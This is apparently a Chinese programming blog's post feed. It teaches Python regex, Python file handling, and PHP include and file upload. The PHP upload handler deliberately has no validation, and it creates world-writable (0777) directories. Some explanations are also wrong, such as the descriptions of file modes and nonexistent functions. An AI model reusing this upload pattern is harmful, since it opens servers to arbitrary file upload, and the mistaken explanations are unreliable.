punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>万<span class="token operator">/</span>每?月<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[\d.]+ 表示 匹配 数字或者点的多次出现 这就可以匹配像： 3 33 33.33 这样的 数字</p><p>万/每?月 是后面紧接着的，如果没有这个，就会匹配到别的数字， 比如 Python3 里面的3。</p><p>其中 每?月 这部分表示匹配 每月 每 这个字可以出现 0次或者1次。</p><p>所以代码这么写：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Python3 高级开发工程师 上海互教教育科技有限公司上海-浦东新区2万/月02-18满员测试开发工程师（C++/python） 上海墨鹍数码科技有限公司上海-浦东新区2.5万/每月02-18未满员Python3 开发工程师 上海德拓信息技术股份有限公司上海-徐汇区1.3万/每月02-18剩余11人测试开发工程师（Python） 赫里普（上海）信息科技有限公司上海-浦东新区1.1万/每月02-18剩余5人'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'([\d.]+)万/每{0,1}月'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>M<span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625155950225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625160004522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="使用正则表达式切割字符串"><a href="#使用正则表达式切割字符串" class="headerlink" title="使用正则表达式切割字符串"></a>使用正则表达式切割字符串</h3><ul><li>字符串对象的split()方法只适用于简单的字符串分割，有时你需要更加灵活的字符串切割。</li></ul><p>比如，我们需要从下面字符串中提取武将的名字：</p><pre class="line-numbers language-python"><code class="language-python">names <span class="token operator">=</span> <span class="token string">'关羽; 张飞, 赵云,马超, 黄忠  李逵'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们发现这些名字之间， 有的是分号隔开，有的是逗号隔开，有的是空格隔开， 而且分割符号周围还有不定数量的空格</p><p>这时，可以使用正则表达式里面的 split 方法：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> renames <span class="token operator">=</span> <span class="token string">'关羽; 张飞, 赵云,马超: 黄忠  李逵'</span>namelist <span class="token operator">=</span> re<span class="token punctuation">.</span>split<span class="token punctuation">(</span>r<span class="token string">'[;,:\s]\s*'</span><span class="token punctuation">,</span>names<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>namelist<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>\s表示空格，它后面为什么加<em>而不加+呢？是因为 *可以匹配0到任意次，而+至少匹配一次，题中的“赵云,马超”中间没有空格，所以\s就出现了0次，为了能够分别正确输出他们，所以采用\s</em>，即使没有出现空格，也要给我匹配上。</p><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625162343279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的文件处理</title>
      <link href="/posts/689e2ef5.html"/>
      <url>/posts/689e2ef5.html</url>
      
        <content type="html"><![CDATA[<p>在Python中用于文件处理的函数主要有以下几个：</p><h2 id="0x01-open-函数"><a href="#0x01-open-函数" class="headerlink" title="0x01 open()函数"></a>0x01 open()函数</h2><p>如果要对一个文件进行处理，首先需要打开这个文件。使用open()函数打开一个文件，创建一个file对象，然后才可以使用其他方法对文件进行读写操作。open()函数的完整语法如下。</p><pre class="line-numbers language-python"><code class="language-python">file object <span class="token operator">=</span> open<span class="token punctuation">(</span>file_name<span class="token punctuation">[</span><span class="token punctuation">,</span>access_mode<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span>buffering<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里面的object就是一个file对象，file_name就是要打开目标文件的<strong>名称</strong>，access_mode时打开文件之后的<strong>模式</strong>，buffering就是要对文件进行的<strong>字符编码</strong>默认情况下是<strong>只读模式r</strong>，也就是不能改写该文件。常见的模式包括<strong>r（读模式）、w（写模式）、a（追加模式）、b（二进制模式）、+（读/写模式）</strong>。而这些模式还可以组合使用，例如，<strong>wb</strong>表示以二进制格式打开一个文件只用于写入，若该文件已存在则将其覆盖，若不存在在创建新文件。<strong>w+</strong> 表示以二进制格式打开一个文件只用于写入，若该文件已存在则将其覆盖，若不存在在创建新文件。<strong>wb+</strong> 表示以二进制格式打开一个文件只用于写入，若该文件已存在则将其覆盖，若不存在在创建新文件。</p><p>下面打开一个以 test.txt 为名的文件，并对其进行读写操作。</p><pre class="line-numbers language-python"><code class="language-python">target <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这里需要注意一下，我们的Windows默认字符编码是gbk，而我们写的代码默认是UTF-8编码的，所以我在末尾加上了一个encoding=’utf-8’进行字符编码，如果不进行编码就会报错。</strong></p><h2 id="0x02-read-函数"><a href="#0x02-read-函数" class="headerlink" title="0x02 read()函数"></a>0x02 read()函数</h2><p>打开一个文件之后，就可以使用read()对其中的内容进行读取了，这个函数格式如下所示。</p><pre class="line-numbers language-python"><code class="language-python">fileObject<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的count表示要从打开文件中读取字节数。例如：</p><pre class="line-numbers language-python"><code class="language-python">str <span class="token operator">=</span> target<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x03-write-函数"><a href="#0x03-write-函数" class="headerlink" title="0x03 write()函数"></a>0x03 write()函数</h2><p>打开一个文件之后还可以使用write()方法将任何字符串写入一个打开的文件。write()函数的格式如下所示.</p><pre class="line-numbers language-python"><code class="language-python">target<span class="token punctuation">.</span>write<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，将“Hello Python”写入到test.txt中，就可以使用write()方法。</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Hello,Python!\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x04-colse-函数"><a href="#0x04-colse-函数" class="headerlink" title="0x04 colse()函数"></a>0x04 colse()函数</h2><p>File对象的close()方法刷新缓冲区里任何还没写入的信息，并关闭该文件，这之后便不能在进行写入。</p><p>还是以上面这段代码为例：</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Hello,Python!\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'我不会被写入，呜呜呜~'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当我们加上close()函数以后，程序运行到它哪里的时候就相当于遇到了红灯，并且会报错。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200119191511112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>除了以上函数，还有很多高效的文件处理函数，像readline()、readtable()、writelines()、writtable()等，这里就不一一介绍了。可以去看一下<a href="https://docs.python.org/zh-cn/3/library/index.html" target="_blank" rel="noopener">Python标准库</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的文件操作</title>
      <link href="/posts/26435206.html"/>
      <url>/posts/26435206.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><p>直接在代码里演示一下它是怎么包含的，我们先定义一个关联数组：<br>t1.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'host'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>        <span class="token string">'mysql'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>        <span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3306</span><span class="token punctuation">,</span>        <span class="token string">'database'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'testdb'</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在用require包含一下这个文件中port的值：<br>t2.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"www.x.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">require</span> <span class="token string">"t1.php"</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$host"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功包含：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103100355227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><p>代码我们不换，把require换成include试一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"www.x.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"t1.php"</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$host"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一样可以包含出来：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103133731712.png#pic_center" alt="在这里插入图片描述"><br> include跟require的区别就是，使用include时，当程序中间代码出错后，后面的代码依然会执行，require就不会执行后续的代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"www.x.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"t7.php"</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$host"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103134027120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"www.x.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">require</span> <span class="token string">"t7.php"</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$host"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103134054602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文档是这么说的：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103140725862.png#pic_center" alt="在这里插入图片描述"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>先构造一个上传页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>文件上传<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造一个接收页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传格式不正确！')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103150855111.png#pic_center" alt="在这里插入图片描述"><br>查看返回页面：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103150927427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>现在我们的上传并不完整，因为并没有获取到文件，要想完整的实现上传，要用到一个函数<strong>move_uploaded_file()</strong>，先来看一下这个函数：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110315321936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="dir-name"><a href="#dir-name" class="headerlink" title="dir_name"></a>dir_name</h5><p>这里涉及到路径，先来一个函数dirname()<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103154048376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这个函数的功能就是返回上级目录的路径：</p><pre class="line-numbers language-php<meta"><code class="language-php<meta"><?php    echo dirname(__DIR__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103154124913.png#pic_center" alt="在这里插入图片描述"></p><p>这里先实现一个目录创建的操作，目录名随时间的变化而变化：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PATH"</span><span class="token punctuation">,</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">PATH</span><span class="token punctuation">.</span><span class="token string">"/upload/img"</span><span class="token punctuation">;</span>    <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string">'UTC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dir1</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Ym"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dir2</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$dir1</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$dir2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"yes"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        echo "no";</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="实现文件上传"><a href="#实现文件上传" class="headerlink" title="实现文件上传"></a>实现文件上传</h5><p>这个文件上传只是走个流程，中间没有加任何验证，过滤什么的：</p><p>update.html</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>文件上传<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 